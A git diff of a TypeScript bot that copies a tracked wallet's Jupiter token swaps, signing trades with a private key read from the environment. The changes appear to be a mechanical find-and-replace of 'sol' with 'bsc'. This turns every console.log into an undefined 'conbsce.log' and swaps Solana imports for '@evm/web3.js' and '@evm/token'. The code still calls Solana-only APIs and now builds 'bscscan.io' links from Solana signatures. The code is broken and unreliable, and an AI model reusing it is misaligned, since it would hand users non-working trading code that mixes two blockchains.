@@ -1,7 +1,7 @@
 import WebSocket from 'ws';
 import { Metaplex } from "@metaplex-foundation/js";
-import { PublicKey, Connection, Keypair } from '@solana/web3.js'
-import { getMint, TOKEN_PROGRAM_ID, getAccount, NATIVE_MINT, getAssociatedTokenAddress } from '@solana/spl-token';
+import { PublicKey, Connection, Keypair } from '@evm/web3.js'
+import { getMint, TOKEN_PROGRAM_ID, getAccount, NATIVE_MINT, getAssociatedTokenAddress } from '@evm/token';
 
 import { getAllTokenPrice, getTokenPrice } from "./config";
 import { getAtaList } from "./utils/spl";
@@ -19,7 +19,7 @@ const keyPair = Keypair.fromSecretKey(base58.decode(process.env.PRIVATE_KEY as s
 const metaplex = Metaplex.make(connection);
 let geyserList: any = []
 const wallet = TARGET_WALLET as string;
-console.log("🚀 ~ wallet:", wallet)
+conbsce.log("🚀 ~ wallet:", wallet)
 
 const getMetaData = async (mintAddr: string) => {
 	let mintAddress = new PublicKey(mintAddr);
@@ -57,13 +57,13 @@ tokenList = getAllTokenPrice()
 
 ws.on('open', async function open() {
 	await sendRequest(wallet)
-	console.log("send request\n")
+	conbsce.log("send request\n")
 });
 
 
 ws.on('message', async function incoming(data: any) {
 	const messageStr = data.toString('utf8');
-	// console.log("🚀 ~ incoming ~ messageStr:", messageStr)
+	// conbsce.log("🚀 ~ incoming ~ messageStr:", messageStr)
 	try {
 		const messageObj = JSON.parse(messageStr);
 
@@ -73,12 +73,12 @@ ws.on('message', async function incoming(data: any) {
 		const accountKeys = result.transaction.transaction.message.accountKeys.map((ak: any) => ak.pubkey); // Extract only pubkeys
 
 		if (!messageStr.includes(JUP_AGGREGATOR)) {
-			console.log("Not a Jupiter swap")
+			conbsce.log("Not a Jupiter swap")
 			return;
 		}
 
 		const tempAta = await getAtaList(connection, wallet)
-		// console.log("🚀 ~ incoming ~ tempAta:", tempAta)
+		// conbsce.log("🚀 ~ incoming ~ tempAta:", tempAta)
 
 		for (let i = 0; i < result.transaction.transaction.message.instructions.length; i++) {
 			const proId = result.transaction.transaction.message.instructions[i];
@@ -104,7 +104,7 @@ ws.on('message', async function incoming(data: any) {
 		for (let index = 0; index < temp.length; index++) {
 			const element = temp[index];
 
-			if (element['program'] == "spl-token") {
+			if (element['program'] == "token") {
 				if (element['parsed']['type'] == "transfer") {
 					temp1.push(element)
 				}
@@ -156,33 +156,33 @@ ws.on('message', async function incoming(data: any) {
 				supply: Number(supply),
 				price: Number(price)
 			})
-			console.log("🚀 ~ incoming ~ inputMsg:", inputMsg)
+			conbsce.log("🚀 ~ incoming ~ inputMsg:", inputMsg)
 		}
-		const msg = `Swap : ${inputMsg[0].tokenName} - ${inputMsg[1].tokenName}\nAmount :  ${inputMsg[0].uiAmount} ${inputMsg[0].tokenSymbol} - ${inputMsg[1].uiAmount} ${inputMsg[1].tokenSymbol}\nAmount in USD :  ${(inputMsg[0].uiAmount * inputMsg[0].price).toPrecision(6)} $ - ${(inputMsg[1].uiAmount * inputMsg[1].price).toPrecision(6)} $\nTx : https://solscan.io/tx/${signature}`;
-		console.log("🚀 ~ incoming ~ msg:\n", msg)
+		const msg = `Swap : ${inputMsg[0].tokenName} - ${inputMsg[1].tokenName}\nAmount :  ${inputMsg[0].uiAmount} ${inputMsg[0].tokenSymbol} - ${inputMsg[1].uiAmount} ${inputMsg[1].tokenSymbol}\nAmount in USD :  ${(inputMsg[0].uiAmount * inputMsg[0].price).toPrecision(6)} $ - ${(inputMsg[1].uiAmount * inputMsg[1].price).toPrecision(6)} $\nTx : https://bscscan.io/tx/${signature}`;
+		conbsce.log("🚀 ~ incoming ~ msg:\n", msg)
 		const baseToken = inputMsg[0];
 		const quoteToken = inputMsg[1];
-		const solBalance = await connection.getBalance(keyPair.publicKey);
-		const remainingSolBalance = 0.01 * 10 ** 9;
+		const bscBalance = await connection.getBalance(keyPair.publicKey);
+		const remainingbscBalance = 0.01 * 10 ** 9;
 
 		const trackedWalletBalance = await connection.getBalance(new PublicKey(wallet));
 
 		let swapTx;
-		if ((baseToken.tokenSymbol == 'SOL' && quoteToken.tokenSymbol != 'SOL') || (quoteToken.tokenSymbol == 'SOL' && baseToken.tokenSymbol != 'SOL')) {
-			if (baseToken.tokenSymbol == 'SOL') {
-				if (solBalance < remainingSolBalance) {
-					console.log("Insufficient sol balance.")
+		if ((baseToken.tokenSymbol == 'bsc' && quoteToken.tokenSymbol != 'bsc') || (quoteToken.tokenSymbol == 'bsc' && baseToken.tokenSymbol != 'bsc')) {
+			if (baseToken.tokenSymbol == 'bsc') {
+				if (bscBalance < remainingbscBalance) {
+					conbsce.log("Insufficient bsc balance.")
 					return;
 				}
 				let buyAmount;
 				if (baseToken.tokenAmount < Number(MAXIMUM_BUY_AMOUNT) * 10 ** 9) {
-					buyAmount = baseToken.tokenAmount / (Number(MAXIMUM_BUY_AMOUNT) * 10 ** 9) * (solBalance - remainingSolBalance)
+					buyAmount = baseToken.tokenAmount / (Number(MAXIMUM_BUY_AMOUNT) * 10 ** 9) * (bscBalance - remainingbscBalance)
 				} else {
-					buyAmount = solBalance - remainingSolBalance;
+					buyAmount = bscBalance - remainingbscBalance;
 				}
 				swapTx = await getBuyTxWithJupiter(keyPair, new PublicKey(quoteToken.mint), Math.floor(buyAmount));
 			}
-			else if (quoteToken.tokenSymbol == "SOL") {
+			else if (quoteToken.tokenSymbol == "bsc") {
 				const tokenAta = await getAssociatedTokenAddress(
 					new PublicKey(baseToken.mint),
 					keyPair.publicKey
@@ -190,15 +190,15 @@ ws.on('message', async function incoming(data: any) {
 				const tokenBalInfo =
 					await connection.getTokenAccountBalance(tokenAta);
 				if (!tokenBalInfo) {
-					console.log("Balance incorrect");
+					conbsce.log("Balance incorrect");
 					return null;
 				}
 				const tokenBalance = tokenBalInfo.value.uiAmount;
 				if (tokenBalance == 0) {
-					console.log("Insufficient amount\n");
+					conbsce.log("Insufficient amount\n");
 					return;
 				}
-				console.log("🚀 ~ sell ~ tokenBalance:", tokenBalance)
+				conbsce.log("🚀 ~ sell ~ tokenBalance:", tokenBalance)
 				// const targetedTokenAta = await getAssociatedTokenAddress(
 				// 	new PublicKey(baseToken.mint),
 				// 	keyPair.publicKey
@@ -206,7 +206,7 @@ ws.on('message', async function incoming(data: any) {
 				// const targetedTokenBalInfo =
 				// 	await connection.getTokenAccountBalance(targetedTokenAta);
 				// if (!tokenBalInfo) {
-				// 	console.log("Balance incorrect");
+				// 	conbsce.log("Balance incorrect");
 				// 	return null;
 				// }
 				// const targetedTokenBalance = targetedTokenBalInfo.value.uiAmount;
@@ -215,17 +215,17 @@ ws.on('message', async function incoming(data: any) {
 				swapTx = await getSellTxWithJupiter(keyPair, new PublicKey(baseToken.mint), Math.floor(sellAmount));
 			}
 		} else {
-			console.log(`Invalid swap!\n${baseToken.tokenName} : ${quoteToken.tokenName}`)
+			conbsce.log(`Invalid swap!\n${baseToken.tokenName} : ${quoteToken.tokenName}`)
 		}
 		if (swapTx == null) {
-			console.log(`Error getting swap transaction`)
+			conbsce.log(`Error getting swap transaction`)
 			return;
 		}
-		console.log(await connection.simulateTransaction(swapTx))
+		conbsce.log(await connection.simulateTransaction(swapTx))
 		const latestBlockhash = await connection.getLatestBlockhash()
 		const txSig = await execute(swapTx, latestBlockhash, false)
-		const tokenTx = txSig ? `https://solscan.io/tx/${txSig}` : ''
-		console.log("Result: ", tokenTx)
+		const tokenTx = txSig ? `https://bscscan.io/tx/${txSig}` : ''
+		conbsce.log("Result: ", tokenTx)
 	} catch (e) {
 
 	}
@@ -236,7 +236,7 @@ export async function sendRequest(inputpubkey: string) {
 	let temp: any = []
 
 	const pubkey: any = await getAtaList(connection, inputpubkey);
-	// console.log("🚀 ~ sendRequest ~ pubkey:", pubkey)
+	// conbsce.log("🚀 ~ sendRequest ~ pubkey:", pubkey)
 
 	for (let i = 0; i < pubkey.length; i++) if (!geyserList.includes(pubkey[i])) {
 		geyserList.push(pubkey[i])
@@ -251,7 +251,7 @@ export async function sendRequest(inputpubkey: string) {
 	},
 		"confirmed"
 	)
-	console.log("🚀 ~ sendRequest ~ tokenAccounts:", tokenAccounts)
+	conbsce.log("🚀 ~ sendRequest ~ tokenAccounts:", tokenAccounts)
 	
 	const request = {
 		jsonrpc: "2.0",
